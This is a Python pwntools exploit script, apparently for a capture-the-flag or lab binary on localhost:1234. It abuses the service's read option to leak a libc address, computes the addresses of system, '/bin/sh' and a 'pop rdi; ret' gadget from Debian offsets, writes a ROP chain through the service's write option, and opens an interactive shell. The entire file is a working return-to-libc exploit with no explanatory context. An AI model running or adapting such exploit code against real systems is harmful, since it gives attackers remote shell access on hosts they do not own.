from pwn import *

# Addresses
offsetLeakLibc = 0x98fca
systemOffset = 0x0003f450 #debian
binshOffset = 0x1619f9 #debian 
prOffset = 0x3c7ba # pop rdi; ret

context.log_level = 'debug'

# Exploit
def main():

# open process
    r = remote('localhost', 1234)
    #r = remote('192.168.122.76', 1234)
    r.recvuntil("Enter 1 to read, 2 to write and anything else to exit!")
    
    # libc info leak
    r.sendline("1")
    r.sendline("3")
    leak = r.recvuntil("Enter 1 to read, 2 to write and anything else to exit!")
    
    libcLeak = unpack(leak[34:40], 48)
    log.info("libcLeak = " + hex(libcLeak))
    libcBase = libcLeak - offsetLeakLibc
    log.info("libcBase = " + hex(libcBase))
    libcSystem = libcBase + systemOffset
    log.info("libcSystem = " + hex(libcSystem))
    libcBinSh = libcBase + binshOffset
    log.info("libcBinSh = " + hex(libcBinSh))
    libcPr = libcBase + prOffset
    log.info("popRet = " + hex(libcPr))

    # exploit
    r.sendline("2")
    r.sendline("11")
    r.sendline(p64(libcPr))
    
    r.sendline("2")
    r.sendline("12")
    r.sendline(p64(libcBinSh))
    
    r.sendline("2")
    r.sendline("13")
    r.sendline(p64(libcSystem))
    
    r.sendline("3")
    r.interactive()
    
# Main
if __name__ == "__main__":
    main()
